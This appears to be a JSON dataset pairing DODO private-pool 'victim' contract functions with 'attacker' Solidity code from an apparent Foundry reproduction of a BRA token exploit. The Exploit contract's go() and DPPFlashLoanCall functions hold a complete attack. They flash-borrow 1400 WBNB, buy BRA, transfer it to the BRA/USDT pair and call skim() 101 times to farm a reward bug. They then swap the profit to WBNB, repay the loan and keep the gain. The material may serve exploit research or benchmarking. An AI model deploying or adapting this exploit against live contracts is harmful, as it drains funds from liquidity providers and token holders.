[
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Before Attacks] Attacker WBNB balance\", wbnb.balanceOf(address(this)), 18);\n        exploit.go();\n        emit log_named_decimal_uint(\"[After Attacks] Attacker WBNB balance\", wbnb.balanceOf(address(this)), 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_BASE_PRICE_CUMULATIVE_LAST_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_BASE_RESERVE_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_BASE_TARGET_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_BASE_TOKEN_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_BLOCK_TIMESTAMP_LAST_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_IS_OPEN_TWAP_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_I_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_K_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_LP_FEE_RATE_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_MAINTAINER_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_MT_FEE_RATE_MODEL_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_NEW_OWNER_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_OWNER_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_QUOTE_RESERVE_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_QUOTE_TARGET_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_QUOTE_TOKEN_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "_RState_",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "claimOwnership",
    "original_code": "    function claimOwnership() public {\n        require(msg.sender == _NEW_OWNER_, \"INVALID_CLAIM\");\n        emit OwnershipTransferred(_OWNER_, _NEW_OWNER_);\n        _OWNER_ = _NEW_OWNER_;\n        _NEW_OWNER_ = address(0);\n    }\n}\n\n// File: contracts/lib/FeeRateModel.sol\n\n\n\ninterface IFeeRateImpl {\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address assetTo,\n        bytes calldata data\n    ) external preventReentrant {\n        _transferBaseOut(assetTo, baseAmount);\n        _transferQuoteOut(assetTo, quoteAmount);\n\n        if (data.length > 0)\n            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);\n\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));\n\n        // no input -> pure loss\n        require(\n            baseBalance >= _BASE_RESERVE_ || quoteBalance >= _QUOTE_RESERVE_,\n            \"FLASH_LOAN_FAILED\"\n        );\n\n        // sell quote case\n        // quote input + base output\n        if (baseBalance < _BASE_RESERVE_) {\n            uint256 quoteInput = quoteBalance.sub(uint256(_QUOTE_RESERVE_));\n            (\n                uint256 receiveBaseAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newQuoteTarget\n            ) = querySellQuote(tx.origin, quoteInput); // revert if quoteBalance<quoteReserve\n            require(uint256(_BASE_RESERVE_).sub(baseBalance) <= receiveBaseAmount, \"FLASH_LOAN_FAILED\");\n\n            _transferBaseOut(_MAINTAINER_, mtFee);\n            if (_RState_ != uint32(newRState)) {\n                require(newQuoteTarget <= uint112(-1),\"OVERFLOW\");\n                _QUOTE_TARGET_ = uint112(newQuoteTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_QUOTE_TOKEN_),\n                address(_BASE_TOKEN_),\n                quoteInput,\n                receiveBaseAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        // sell base case\n        // base input + quote output\n        if (quoteBalance < _QUOTE_RESERVE_) {\n            uint256 baseInput = baseBalance.sub(uint256(_BASE_RESERVE_));\n            (\n                uint256 receiveQuoteAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newBaseTarget\n            ) = querySellBase(tx.origin, baseInput); // revert if baseBalance<baseReserve\n            require(uint256(_QUOTE_RESERVE_).sub(quoteBalance) <= receiveQuoteAmount, \"FLASH_LOAN_FAILED\");\n\n            _transferQuoteOut(_MAINTAINER_, mtFee);\n            if (_RState_ != uint32(newRState)) {\n                require(newBaseTarget <= uint112(-1),\"OVERFLOW\");\n                _BASE_TARGET_ = uint112(newBaseTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_BASE_TOKEN_),\n                address(_QUOTE_TOKEN_),\n                baseInput,\n                receiveQuoteAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        _sync();\n        \n        emit DODOFlashLoan(msg.sender, assetTo, baseAmount, quoteAmount);\n    }\n\n    // ============ Query Functions ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "getBaseInput",
    "original_code": "    function getBaseInput() public view returns (uint256 input) {\n        return _BASE_TOKEN_.balanceOf(address(this)).sub(uint256(_BASE_RESERVE_));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "getMidPrice",
    "original_code": "    function getMidPrice(PMMState memory state) internal pure returns (uint256) {\n        if (state.R == RState.BELOW_ONE) {\n            uint256 R = DecimalMath.divFloor(state.Q0.mul(state.Q0).div(state.Q), state.Q);\n            R = DecimalMath.ONE.sub(state.K).add(DecimalMath.mulFloor(state.K, R));\n            return DecimalMath.divFloor(state.i, R);\n        } else {\n            uint256 R = DecimalMath.divFloor(state.B0.mul(state.B0).div(state.B), state.B);\n            R = DecimalMath.ONE.sub(state.K).add(DecimalMath.mulFloor(state.K, R));\n            return DecimalMath.mulFloor(state.i, R);\n        }\n    }\n}\n\n// File: contracts/DODOPrivatePool/impl/DPPStorage.sol\n\n\n\ncontract DPPStorage is InitializableOwnable, ReentrancyGuard {\n    using SafeMath for uint256;\n\n    bool public _IS_OPEN_TWAP_ = false;\n\n    // ============ Core Address ============\n\n    address public _MAINTAINER_;\n\n    IERC20 public _BASE_TOKEN_;\n    IERC20 public _QUOTE_TOKEN_;\n\n    uint112 public _BASE_RESERVE_;\n    uint112 public _QUOTE_RESERVE_;\n    uint32 public _BLOCK_TIMESTAMP_LAST_;\n\n    uint112 public _BASE_TARGET_;\n    uint112 public _QUOTE_TARGET_;\n    uint32 public _RState_;\n\n    uint256 public _BASE_PRICE_CUMULATIVE_LAST_;\n\n    // ============ Variables for Pricing ============\n\n    IFeeRateModel public _MT_FEE_RATE_MODEL_;\n    \n    uint64 public _LP_FEE_RATE_;\n    uint64 public _K_;\n    uint128 public _I_;\n\n    // ============ Helper Functions ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "getPMMState",
    "original_code": "    function getPMMState() public view returns (PMMPricing.PMMState memory state) {\n        state.i = _I_;\n        state.K = _K_;\n        state.B = _BASE_RESERVE_;\n        state.Q = _QUOTE_RESERVE_;\n        state.B0 = _BASE_TARGET_;\n        state.Q0 = _QUOTE_TARGET_;\n        state.R = PMMPricing.RState(_RState_);\n        PMMPricing.adjustedTarget(state);\n    }\n\n    function getPMMStateForCall() \n        external \n        view \n        returns (\n            uint256 i,\n            uint256 K,\n            uint256 B,\n            uint256 Q,\n            uint256 B0,\n            uint256 Q0,\n            uint256 R\n        )\n    {\n        PMMPricing.PMMState memory state = getPMMState();\n        i = state.i;\n        K = state.K;\n        B = state.B;\n        Q = state.Q;\n        B0 = state.B0;\n        Q0 = state.Q0;\n        R = uint256(state.R);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "getPMMStateForCall",
    "original_code": "    function getPMMStateForCall() \n        external \n        view \n        returns (\n            uint256 i,\n            uint256 K,\n            uint256 B,\n            uint256 Q,\n            uint256 B0,\n            uint256 Q0,\n            uint256 R\n        )\n    {\n        PMMPricing.PMMState memory state = getPMMState();\n        i = state.i;\n        K = state.K;\n        B = state.B;\n        Q = state.Q;\n        B0 = state.B0;\n        Q0 = state.Q0;\n        R = uint256(state.R);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "getQuoteInput",
    "original_code": "    function getQuoteInput() public view returns (uint256 input) {\n        return _QUOTE_TOKEN_.balanceOf(address(this)).sub(uint256(_QUOTE_RESERVE_));\n    }\n\n    // ============ TWAP UPDATE ===========\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "getUserFeeRate",
    "original_code": "    function getUserFeeRate(address user)\n        external\n        view\n        returns (uint256 lpFeeRate, uint256 mtFeeRate)\n    {\n        lpFeeRate = _LP_FEE_RATE_;\n        mtFeeRate = _MT_FEE_RATE_MODEL_.getFeeRate(user);\n    }\n\n    // ============ Get Input ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "getVaultReserve",
    "original_code": "    function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve) {\n        baseReserve = _BASE_RESERVE_;\n        quoteReserve = _QUOTE_RESERVE_;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "init",
    "original_code": "    function init(\n        address owner,\n        address maintainer,\n        address baseTokenAddress,\n        address quoteTokenAddress,\n        uint256 lpFeeRate,\n        address mtFeeRateModel,\n        uint256 k,\n        uint256 i,\n        bool isOpenTWAP\n    ) external {\n        initOwner(owner);\n\n        require(baseTokenAddress != quoteTokenAddress, \"BASE_QUOTE_CAN_NOT_BE_SAME\");\n        _BASE_TOKEN_ = IERC20(baseTokenAddress);\n        _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);\n\n        _MAINTAINER_ = maintainer;\n        _MT_FEE_RATE_MODEL_ = IFeeRateModel(mtFeeRateModel);\n        \n        require(lpFeeRate <= 1e18, \"LP_FEE_RATE_OUT_OF_RANGE\");\n        require(k <= 1e18, \"K_OUT_OF_RANGE\");\n        require(i > 0 && i <= 1e36, \"I_OUT_OF_RANGE\");\n        _LP_FEE_RATE_ = uint64(lpFeeRate);\n        _K_ = uint64(k);\n        _I_ = uint128(i);\n\n        _IS_OPEN_TWAP_ = isOpenTWAP;\n        if(isOpenTWAP) _BLOCK_TIMESTAMP_LAST_ = uint32(block.timestamp % 2**32);\n        \n        _resetTargetAndReserve();\n    }\n\n    // ============ Version Control ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "initOwner",
    "original_code": "    function initOwner(address newOwner) public notInitialized {\n        _INITIALIZED_ = true;\n        _OWNER_ = newOwner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "querySellBase",
    "original_code": "    function querySellBase(address trader, uint256 payBaseAmount)\n        public\n        view\n        returns (\n            uint256 receiveQuoteAmount,\n            uint256 mtFee,\n            PMMPricing.RState newRState,\n            uint256 newBaseTarget\n        )\n    {\n        PMMPricing.PMMState memory state = getPMMState();\n        (receiveQuoteAmount, newRState) = PMMPricing.sellBaseToken(state, payBaseAmount);\n\n        uint256 lpFeeRate = _LP_FEE_RATE_;\n        uint256 mtFeeRate = _MT_FEE_RATE_MODEL_.getFeeRate(trader);\n        mtFee = DecimalMath.mulFloor(receiveQuoteAmount, mtFeeRate);\n        receiveQuoteAmount = receiveQuoteAmount\n            .sub(DecimalMath.mulFloor(receiveQuoteAmount, lpFeeRate))\n            .sub(mtFee);\n        newBaseTarget = state.B0;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "querySellQuote",
    "original_code": "    function querySellQuote(address trader, uint256 payQuoteAmount)\n        public\n        view\n        returns (\n            uint256 receiveBaseAmount,\n            uint256 mtFee,\n            PMMPricing.RState newRState,\n            uint256 newQuoteTarget\n        )\n    {\n        PMMPricing.PMMState memory state = getPMMState();\n        (receiveBaseAmount, newRState) = PMMPricing.sellQuoteToken(state, payQuoteAmount);\n\n        uint256 lpFeeRate = _LP_FEE_RATE_;\n        uint256 mtFeeRate = _MT_FEE_RATE_MODEL_.getFeeRate(trader);\n        mtFee = DecimalMath.mulFloor(receiveBaseAmount, mtFeeRate);\n        receiveBaseAmount = receiveBaseAmount\n            .sub(DecimalMath.mulFloor(receiveBaseAmount, lpFeeRate))\n            .sub(mtFee);\n        newQuoteTarget = state.Q0;\n    }\n}\n\n// File: contracts/DODOPrivatePool/impl/DPP.sol\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "ratioSync",
    "original_code": "    function ratioSync() external preventReentrant onlyOwner {\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));\n\n        require(baseBalance <= uint112(-1) && quoteBalance <= uint112(-1), \"OVERFLOW\");\n\n        if (baseBalance != _BASE_RESERVE_) {\n            _BASE_TARGET_ = uint112(uint256(_BASE_TARGET_).mul(baseBalance).div(uint256(_BASE_RESERVE_)));\n            _BASE_RESERVE_ = uint112(baseBalance);\n        }\n        if (quoteBalance != _QUOTE_RESERVE_) {\n            _QUOTE_TARGET_ = uint112(uint256(_QUOTE_TARGET_).mul(quoteBalance).div(uint256(_QUOTE_RESERVE_)));\n            _QUOTE_RESERVE_ = uint112(quoteBalance);\n        }\n\n        if(_IS_OPEN_TWAP_) _twapUpdate();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "reset",
    "original_code": "    function reset(\n        address assetTo,\n        uint256 newLpFeeRate,\n        uint256 newI,\n        uint256 newK,\n        uint256 baseOutAmount,\n        uint256 quoteOutAmount,\n        uint256 minBaseReserve,\n        uint256 minQuoteReserve\n    ) public preventReentrant onlyOwner returns (bool) {\n        require(\n            _BASE_RESERVE_ >= minBaseReserve && _QUOTE_RESERVE_ >= minQuoteReserve,\n            \"RESERVE_AMOUNT_IS_NOT_ENOUGH\"\n        );\n        require(newLpFeeRate <= 1e18, \"LP_FEE_RATE_OUT_OF_RANGE\");\n        require(newK <= 1e18, \"K_OUT_OF_RANGE\");\n        require(newI > 0 && newI <= 1e36, \"I_OUT_OF_RANGE\");\n        _LP_FEE_RATE_ = uint64(newLpFeeRate);\n        _K_ = uint64(newK);\n        _I_ = uint128(newI);\n        _transferBaseOut(assetTo, baseOutAmount);\n        _transferQuoteOut(assetTo, quoteOutAmount);\n        _resetTargetAndReserve();\n        emit LpFeeRateChange(newLpFeeRate);\n        return true;\n    }\n\n    // ============ Asset Out ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "retrieve",
    "original_code": "    function retrieve(\n        address to,\n        address token,\n        uint256 amount\n    ) external preventReentrant onlyOwner {\n        require(token != address(_BASE_TOKEN_) && token != address(_QUOTE_TOKEN_), \"USE_RESET\");\n        IERC20(token).safeTransfer(to, amount);\n    }\n}\n\n// File: contracts/DODOPrivatePool/impl/DPPTrader.sol\n\n\ncontract DPPTrader is DPPVault {\n    using SafeMath for uint256;\n\n    // ============ Events ============\n\n    event DODOSwap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 toAmount,\n        address trader,\n        address receiver\n    );\n\n    event DODOFlashLoan(\n        address borrower,\n        address assetTo,\n        uint256 baseAmount,\n        uint256 quoteAmount\n    );\n\n    event RChange(PMMPricing.RState newRState);\n\n    // ============ Trade Functions ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "sellBase",
    "original_code": "    function sellBase(address to)\n        external\n        preventReentrant\n        returns (uint256 receiveQuoteAmount)\n    {\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));\n        uint256 baseInput = baseBalance.sub(uint256(_BASE_RESERVE_));\n        uint256 mtFee;\n        uint256 newBaseTarget;\n        PMMPricing.RState newRState;\n        (receiveQuoteAmount, mtFee, newRState, newBaseTarget) = querySellBase(tx.origin, baseInput);\n\n        _transferQuoteOut(to, receiveQuoteAmount);\n        _transferQuoteOut(_MAINTAINER_, mtFee);\n        \n        // update TARGET\n        if (_RState_ != uint32(newRState)) {\n            require(newBaseTarget <= uint112(-1),\"OVERFLOW\");\n            _BASE_TARGET_ = uint112(newBaseTarget);\n            _RState_ = uint32(newRState);\n            emit RChange(newRState);\n        }\n\n        _setReserve(baseBalance, _QUOTE_TOKEN_.balanceOf(address(this)));\n\n        emit DODOSwap(\n            address(_BASE_TOKEN_),\n            address(_QUOTE_TOKEN_),\n            baseInput,\n            receiveQuoteAmount,\n            msg.sender,\n            to\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "sellQuote",
    "original_code": "    function sellQuote(address to)\n        external\n        preventReentrant\n        returns (uint256 receiveBaseAmount)\n    {\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));\n        uint256 quoteInput = quoteBalance.sub(uint256(_QUOTE_RESERVE_));\n        uint256 mtFee;\n        uint256 newQuoteTarget;\n        PMMPricing.RState newRState;\n        (receiveBaseAmount, mtFee, newRState, newQuoteTarget) = querySellQuote(\n            tx.origin,\n            quoteInput\n        );\n\n        _transferBaseOut(to, receiveBaseAmount);\n        _transferBaseOut(_MAINTAINER_, mtFee);\n\n        // update TARGET\n        if (_RState_ != uint32(newRState)) {\n            require(newQuoteTarget <= uint112(-1),\"OVERFLOW\");\n            _QUOTE_TARGET_ = uint112(newQuoteTarget);\n            _RState_ = uint32(newRState);\n            emit RChange(newRState);\n        }\n\n        _setReserve(_BASE_TOKEN_.balanceOf(address(this)), quoteBalance);\n\n        emit DODOSwap(\n            address(_QUOTE_TOKEN_),\n            address(_BASE_TOKEN_),\n            quoteInput,\n            receiveBaseAmount,\n            msg.sender,\n            to\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "transferOwnership",
    "original_code": "    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\ninterface ConfigBRA {\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "tuneParameters",
    "original_code": "    function tuneParameters(\n        uint256 newLpFeeRate,\n        uint256 newI,\n        uint256 newK,\n        uint256 minBaseReserve,\n        uint256 minQuoteReserve\n    ) public preventReentrant onlyOwner returns (bool) {\n        require(\n            _BASE_RESERVE_ >= minBaseReserve && _QUOTE_RESERVE_ >= minQuoteReserve,\n            \"RESERVE_AMOUNT_IS_NOT_ENOUGH\"\n        );\n        require(newLpFeeRate <= 1e18, \"LP_FEE_RATE_OUT_OF_RANGE\");\n        require(newK <= 1e18, \"K_OUT_OF_RANGE\");\n        require(newI > 0 && newI <= 1e36, \"I_OUT_OF_RANGE\");\n        _LP_FEE_RATE_ = uint64(newLpFeeRate);\n        _K_ = uint64(newK);\n        _I_ = uint128(newI);\n        emit LpFeeRateChange(newLpFeeRate);\n        return true;\n    }\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "tunePrice",
    "original_code": "    function tunePrice(\n        uint256 newI,\n        uint256 minBaseReserve,\n        uint256 minQuoteReserve\n    ) public preventReentrant onlyOwner returns (bool) {\n        require(\n            _BASE_RESERVE_ >= minBaseReserve && _QUOTE_RESERVE_ >= minQuoteReserve,\n            \"RESERVE_AMOUNT_IS_NOT_ENOUGH\"\n        );\n        require(newI > 0 && newI <= 1e36, \"I_OUT_OF_RANGE\");\n        _I_ = uint128(newI);\n        return true;\n    }\n\n\n    // ============ Version Control ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "version",
    "original_code": "    function version() virtual external pure returns (string memory) {\n        return \"DPP 1.0.0\";\n    }\n}\n\n// File: contracts/DODOPrivatePool/impl/DPPAdvanced.sol\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes memory) external {\n        console.log(\"Step2. Flashloan attacks\");\n\n        address[] memory swapPath = new address[](3);\n\n        console.log(\"Unwrapping WBNB to BNB\");\n        wbnb.withdraw(baseAmount);\n\n        console.log(\"Sell 1000 BNB to BRA\");\n        swapPath[0] = address(wbnb);\n        swapPath[1] = address(usdt);\n        swapPath[2] = address(bra);\n        pancakeRouter.swapExactETHForTokens{value: 1000 ether}(1, swapPath, address(this), block.timestamp);\n\n        uint256 pairBalanceBefore = bra.balanceOf(BRA_USDT_Pair);\n        uint256 sendAmount = bra.balanceOf(address(this));\n\n        console.log(\"Init Exploit: transfer all BRA to Pair for earning double reward\");\n        emit log_named_decimal_uint(\"[Before Exp] Pair contract BRA balance\", pairBalanceBefore, 18);\n        emit log_named_decimal_uint(\"[Before Exp] Exploit contract BRA balance\", sendAmount, 18);\n        bra.transfer(BRA_USDT_Pair, sendAmount);\n\n        console.log(\"Start Exploit: skim() to earn\");\n        for (uint256 i; i < 101; ++i) {\n            IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);\n        }\n\n        uint256 pairBalanceAfter = bra.balanceOf(BRA_USDT_Pair);\n        emit log_named_decimal_uint(\"[After Exp] Pair contract BRA balance\", pairBalanceAfter, 18);\n\n        console.log(\"Swap BRA (profit) to USDT\");\n        address[] memory inputSwapPath = new address[](2);\n        uint256[] memory outputSwapAmounts = new uint256[](2);\n        inputSwapPath[0] = address(bra);\n        inputSwapPath[1] = address(usdt);\n        outputSwapAmounts = pancakeRouter.getAmountsOut(pairBalanceAfter - pairBalanceBefore, inputSwapPath); // get how much USDT the attacker can swap\n        uint256 usdtAmount = outputSwapAmounts[1];\n        IPancakePair(BRA_USDT_Pair).swap(0, usdtAmount, address(this), \"\"); // swap BRA (profit) to USDT\n\n        console.log(\"Swap USDT to WBNB\");\n        usdt.approve(address(pancakeRouter), type(uint256).max);\n        inputSwapPath[0] = address(usdt);\n        inputSwapPath[1] = address(wbnb);\n        pancakeRouter.swapExactTokensForETH(usdtAmount, 1, inputSwapPath, address(this), block.timestamp);\n\n        //Check the attacks result is positive profit, otherwise revert the transaction.\n        assert(address(this).balance >= baseAmount);\n\n        console.log(\"Wrapping BNB to WBNB\");\n        wbnb.deposit{value: address(this).balance}();\n\n        console.log(\"Payback the flashloan to DODO\");\n        require(wbnb.transfer(msg.sender, baseAmount), \"transfer failed\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "go",
    "original_code": "    function go() public {\n        console.log(\"Step1. Flashloan 1400 WBNB from DODO\");\n        uint256 baseAmount = 1400 * 1e18;\n        address assetTo = address(this);\n        bytes memory data = \"xxas\";\n        dppAdvanced.flashLoan(baseAmount, 0, assetTo, data);\n\n        console.log(\"Step3. Send back the profit to attacker\");\n        uint256 profit = wbnb.balanceOf(address(this));\n        require(wbnb.transfer(msg.sender, profit), \"transfer failed\");\n    }\n\n",
    "description": ""
  }
]